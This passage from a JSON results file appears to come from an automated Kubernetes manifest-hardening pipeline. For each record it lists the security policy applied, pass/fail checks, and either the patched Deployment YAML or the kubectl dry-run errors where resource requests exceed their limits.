    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: dhcp-server\n  namespace: kube-system\nspec:\n  selector:\n    matchLabels:\n      app: dhcp-server\n  template:\n    metadata:\n      labels:\n        app: dhcp-server\n    spec:\n      containers:\n      - args:\n        - sleep 1000000000;\n        command:\n        - /bin/sh\n        - -c\n        - --\n        image: xunholy/dhcp-server:stable\n        imagePullPolicy: Always\n        name: dhcp-server\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n        volumeMounts:\n        - mountPath: /etc/dhcp\n          name: server-config\n      volumes:\n      - emptyDir: {}\n        name: server-config\n",
    "errors": []
  },
  {
    "id": "01223",
    "policy_id": "read_only_root_fs",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The CronJob \"my-cron-job\" is invalid: \n* spec.jobTemplate.spec.template.spec.containers[0].resources.requests: Invalid value: \"100m\": must be less than or equal to cpu limit of 10m\n* spec.jobTemplate.spec.template.spec.containers[0].resources.requests: Invalid value: \"128Mi\": must be less than or equal to memory limit of 16Mi"
    ]
  },
  {
    "id": "01224",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The CronJob \"my-cron-job\" is invalid: \n* spec.jobTemplate.spec.template.spec.containers[0].resources.requests: Invalid value: \"128Mi\": must be less than or equal to memory limit of 16Mi\n* spec.jobTemplate.spec.template.spec.containers[0].resources.requests: Invalid value: \"100m\": must be less than or equal to cpu limit of 10m"
    ]
  },
  {
    "id": "01225",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The CronJob \"my-cron-job\" is invalid: \n* spec.jobTemplate.spec.template.spec.containers[0].resources.requests: Invalid value: \"100m\": must be less than or equal to cpu limit of 10m\n* spec.jobTemplate.spec.template.spec.containers[0].resources.requests: Invalid value: \"128Mi\": must be less than or equal to memory limit of 16Mi"
    ]
  },
  {
    "id": "01226",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20211108-892eb8add1\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          readOnlyRootFilesystem: true\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "errors": []
  },
  {
    "id": "01227",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20211108-892eb8add1\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          readOnlyRootFilesystem: true\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "errors": []
  },
  {
    "id": "01228",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: prow\n  name: horologium\n  labels:\n    app: horologium\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: horologium\n  template:\n    metadata:\n      labels:\n        app: horologium\n    spec:\n      serviceAccountName: horologium\n      containers:\n      - name: horologium\n        image: gcr.io/k8s-prow/horologium:v20211108-892eb8add1\n        args:\n        - --config-path=/etc/config/config.yaml\n        - --dry-run=false\n        - --job-config-path=/etc/job-config\n        ports:\n        - name: metrics\n          containerPort: 9090\n        volumeMounts:\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - ALL\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          readOnlyRootFilesystem: true\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n",
    "errors": []
  },
  {
    "id": "01229",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: webhook\n  namespace: knative-serving\n  labels:\n    serving.knative.dev/release: devel\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: webhook\n      role: webhook\n  template:\n    metadata:\n      annotations:\n        cluster-autoscaler.kubernetes.io/safe-to-evict: 'false'\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: webhook\n        role: webhook\n        serving.knative.dev/release: devel\n    spec:\n      serviceAccountName: controller\n      containers:\n      - name: webhook\n        image: knative.dev/serving/cmd/webhook:stable\n        ports:\n        - name: metrics-port\n          containerPort: 9090\n        - name: profiling\n          containerPort: 8008\n        resources:\n          requests:\n            cpu: 20m\n            memory: 20Mi\n          limits:\n            cpu: 200m\n            memory: 200Mi\n        env:\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONFIG_LOGGING_NAME\n          value: config-logging\n        - name: CONFIG_OBSERVABILITY_NAME\n          value: config-observability\n        - name: METRICS_DOMAIN\n          value: knative.dev/serving\n        securityContext:\n          allowPrivilegeEscalation: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          privileged: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01230",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: webhook\n  namespace: knative-serving\n  labels:\n    serving.knative.dev/release: devel\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: webhook\n      role: webhook\n  template:\n    metadata:\n      annotations:\n        cluster-autoscaler.kubernetes.io/safe-to-evict: 'false'\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: webhook\n        role: webhook\n        serving.knative.dev/release: devel\n    spec:\n      serviceAccountName: controller\n      containers:\n      - name: webhook\n        image: knative.dev/serving/cmd/webhook:stable\n        ports:\n        - name: metrics-port\n          containerPort: 9090\n        - name: profiling\n          containerPort: 8008\n        resources:\n          requests:\n            cpu: 20m\n            memory: 20Mi\n          limits:\n            cpu: 200m\n            memory: 200Mi\n        env:\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONFIG_LOGGING_NAME\n          value: config-logging\n        - name: CONFIG_OBSERVABILITY_NAME\n          value: config-observability\n        - name: METRICS_DOMAIN\n          value: knative.dev/serving\n        securityContext:\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          runAsNonRoot: true\n",
    "errors": []
  },
  {
    "id": "01231",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: webhook\n  namespace: knative-serving\n  labels:\n    serving.knative.dev/release: devel\nspec:\n  replicas: 1\n  selector:\n    matchLabels:\n      app: webhook\n      role: webhook\n  template:\n    metadata:\n      annotations:\n        cluster-autoscaler.kubernetes.io/safe-to-evict: 'false'\n        sidecar.istio.io/inject: 'false'\n      labels:\n        app: webhook\n        role: webhook\n        serving.knative.dev/release: devel\n    spec:\n      serviceAccountName: controller\n      containers:\n      - name: webhook\n        image: knative.dev/serving/cmd/webhook:stable\n        ports:\n        - name: metrics-port\n          containerPort: 9090\n        - name: profiling\n          containerPort: 8008\n        resources:\n          requests:\n            cpu: 20m\n            memory: 20Mi\n          limits:\n            cpu: 200m\n            memory: 200Mi\n        env:\n        - name: SYSTEM_NAMESPACE\n          valueFrom:\n            fieldRef:\n              fieldPath: metadata.namespace\n        - name: CONFIG_LOGGING_NAME\n          value: config-logging\n        - name: CONFIG_OBSERVABILITY_NAME\n          value: config-observability\n        - name: METRICS_DOMAIN\n          value: knative.dev/serving\n        securityContext:\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01232",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: borisluchnikov/hs-paymentservice:v0.0.2\n        ports:\n        - containerPort: 50051\n        env:\n        - name: PORT\n          value: '50051'\n        - name: DISABLE_TRACING\n          value: '1'\n        - name: DISABLE_PROFILER\n          value: '1'\n        - name: DISABLE_DEBUGGER\n          value: '1'\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01233",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: borisluchnikov/hs-paymentservice:v0.0.2\n        ports:\n        - containerPort: 50051\n        env:\n        - name: PORT\n          value: '50051'\n        - name: DISABLE_TRACING\n          value: '1'\n        - name: DISABLE_PROFILER\n          value: '1'\n        - name: DISABLE_DEBUGGER\n          value: '1'\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n",
    "errors": []
  },
  {
    "id": "01234",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: borisluchnikov/hs-paymentservice:v0.0.2\n        ports:\n        - containerPort: 50051\n        env:\n        - name: PORT\n          value: '50051'\n        - name: DISABLE_TRACING\n          value: '1'\n        - name: DISABLE_PROFILER\n          value: '1'\n        - name: DISABLE_DEBUGGER\n          value: '1'\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01235",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  name: paymentservice\n  labels:\n    app: paymentservice\nspec:\n  replicas: 3\n  selector:\n    matchLabels:\n      app: paymentservice\n  template:\n    metadata:\n      labels:\n        app: paymentservice\n    spec:\n      containers:\n      - name: server\n        image: borisluchnikov/hs-paymentservice:v0.0.2\n        ports:\n        - containerPort: 50051\n        env:\n        - name: PORT\n          value: '50051'\n        - name: DISABLE_TRACING\n          value: '1'\n        - name: DISABLE_PROFILER\n          value: '1'\n        - name: DISABLE_DEBUGGER\n          value: '1'\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n",
    "errors": []
  },
  {
    "id": "01236",
    "policy_id": "read_only_root_fs",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210615-c3915f8ad7\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n        securityContext:\n          readOnlyRootFilesystem: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "errors": []
  },
  {
    "id": "01237",
    "policy_id": "run_as_non_root",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210615-c3915f8ad7\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n        securityContext:\n          runAsNonRoot: true\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          readOnlyRootFilesystem: true\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "errors": []
  },
  {
    "id": "01238",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210615-c3915f8ad7\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "errors": []
  },
  {
    "id": "01239",
    "policy_id": "set_requests_limits",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": "apiVersion: apps/v1\nkind: Deployment\nmetadata:\n  namespace: default\n  name: hook\n  labels:\n    app: hook\nspec:\n  replicas: 4\n  selector:\n    matchLabels:\n      app: hook\n  template:\n    metadata:\n      labels:\n        app: hook\n    spec:\n      serviceAccountName: hook\n      containers:\n      - name: hook\n        image: gcr.io/k8s-prow/hook:v20210615-c3915f8ad7\n        imagePullPolicy: Always\n        args:\n        - --dry-run=false\n        - --slack-token-file=/etc/slack/token\n        - --github-endpoint=http://ghproxy\n        - --github-endpoint=https://api.github.com\n        - --github-token-path=/etc/github/oauth\n        - --config-path=/etc/config/config.yaml\n        - --job-config-path=/etc/job-config\n        env:\n        - name: KUBECONFIG\n          value: /etc/kubeconfig/config\n        ports:\n        - name: http\n          containerPort: 8888\n        volumeMounts:\n        - name: slack\n          mountPath: /etc/slack\n        - name: hmac\n          mountPath: /etc/webhook\n          readOnly: true\n        - name: oauth\n          mountPath: /etc/github\n          readOnly: true\n        - name: config\n          mountPath: /etc/config\n          readOnly: true\n        - name: job-config\n          mountPath: /etc/job-config\n          readOnly: true\n        - name: plugins\n          mountPath: /etc/plugins\n          readOnly: true\n        - name: cat-api\n          mountPath: /etc/cat-api\n          readOnly: true\n        - name: unsplash-api\n          mountPath: /etc/unsplash-api\n          readOnly: true\n        - name: kubeconfig\n          mountPath: /etc/kubeconfig\n          readOnly: true\n        livenessProbe:\n          httpGet:\n            path: /healthz\n            port: 8081\n          initialDelaySeconds: 3\n          periodSeconds: 3\n        readinessProbe:\n          httpGet:\n            path: /healthz/ready\n            port: 8081\n          initialDelaySeconds: 10\n          periodSeconds: 3\n          timeoutSeconds: 600\n        resources:\n          requests:\n            cpu: 100m\n            memory: 128Mi\n          limits:\n            cpu: 500m\n            memory: 256Mi\n        securityContext:\n          privileged: false\n          capabilities:\n            drop:\n            - NET_RAW\n            - NET_ADMIN\n            - SYS_ADMIN\n            - SYS_MODULE\n            - SYS_PTRACE\n            - SYS_CHROOT\n          allowPrivilegeEscalation: false\n          runAsNonRoot: true\n          readOnlyRootFilesystem: true\n      volumes:\n      - name: slack\n        secret:\n          secretName: slack-token\n      - name: hmac\n        secret:\n          secretName: hmac-token\n      - name: oauth\n        secret:\n          secretName: oauth-token\n      - name: config\n        configMap:\n          name: config\n      - name: job-config\n        configMap:\n          name: job-config\n      - name: plugins\n        configMap:\n          name: plugins\n      - name: cat-api\n        configMap:\n          name: cat-api-key\n      - name: unsplash-api\n        secret:\n          secretName: unsplash-api-key\n      - name: kubeconfig\n        secret:\n          defaultMode: 420\n          secretName: kubeconfig\n",
    "errors": []
  },
  {
    "id": "01240",
    "policy_id": "no_latest_tag",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Pod \"component-nodejs-dependence-npm\" is invalid: spec.containers[0].resources.requests: Invalid value: \"4G\": must be less than or equal to memory limit of 256Mi"
    ]
  },
  {
    "id": "01241",
    "policy_id": "read_only_root_fs",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Pod \"component-nodejs-dependence-npm\" is invalid: spec.containers[0].resources.requests: Invalid value: \"4G\": must be less than or equal to memory limit of 256Mi"
    ]
  },
  {
    "id": "01242",
    "policy_id": "run_as_non_root",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Pod \"component-nodejs-dependence-npm\" is invalid: spec.containers[0].resources.requests: Invalid value: \"4G\": must be less than or equal to memory limit of 256Mi"
    ]
  },
  {
    "id": "01243",
    "policy_id": "set_requests_limits",
    "accepted": false,
    "ok_schema": false,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
    "patched_yaml": null,
    "errors": [
      "kubectl dry-run failed: The Pod \"component-nodejs-dependence-npm\" is invalid: spec.containers[0].resources.requests: Invalid value: \"4G\": must be less than or equal to memory limit of 256Mi"
    ]
  },
  {
    "id": "01244",
    "policy_id": "no_latest_tag",
    "accepted": true,
    "ok_schema": true,
    "ok_policy": true,
    "ok_safety": true,
    "ok_rescan": true,
